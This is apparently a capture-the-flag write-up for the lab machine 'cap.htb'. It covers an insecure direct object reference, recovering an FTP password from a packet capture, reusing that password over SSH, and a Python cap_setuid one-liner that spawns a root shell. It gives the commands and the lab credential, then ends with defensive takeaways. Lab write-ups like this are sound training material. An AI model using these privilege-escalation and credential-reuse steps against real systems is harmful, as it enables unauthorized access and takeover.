02 / PARTIAL SPOILER

Enumeration

The dashboard generated downloadable captures using numeric identifiers. Requesting /download/0 returned a capture outside the current user's expected record, confirming an insecure direct object reference.

  • Sequential capture identifiers
  • Unauthorized access to /download/0
  • FTP control traffic inside the PCAP
  • Credential reuse across FTP and SSH
Retrieve and inspect the capture / bash
wget http://cap.htb/download/0 -O capture.pcap
capinfos capture.pcap
tcpdump -A -r capture.pcap 'tcp port 21'
tshark -r capture.pcap -Y ftp.request -T fields -e ftp.request.command -e ftp.request.arg

03 / SPOILER

Exploitation: foothold

Packet analysis recovered the lab FTP credential nathan:Buck3tH4TF0RM3!. Reuse of that password on SSH provided a stable shell as nathan.

  • Filter the PCAP for FTP commands.
  • Recover the USER and PASS values.
  • Validate the credentials against FTP.
  • Test authorized password reuse against SSH.
Validate the recovered lab credential / bash
ftp cap.htb
# USER nathan
# PASS Buck3tH4TF0RM3!
ssh nathan@cap.htb

04 / SPOILER

Post-exploitation

Capability enumeration showed /usr/bin/python3.8 with cap_setuid. That capability allows the interpreter to change its process UID to zero, bypassing the normal need for a SUID executable.

  • Collect the user proof.
  • Enumerate file capabilities recursively.
  • Confirm cap_setuid on Python 3.8.
  • Set UID zero and execute a root shell.
Capability abuse / python
getcap -r / 2>/dev/null
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
cat /root/root.txt

Key takeaways

  • Authorize object access independently of predictable identifiers.
  • Avoid plaintext protocols for credentials.
  • Prevent password reuse across services.
  • Audit file capabilities as carefully as SUID permissions.
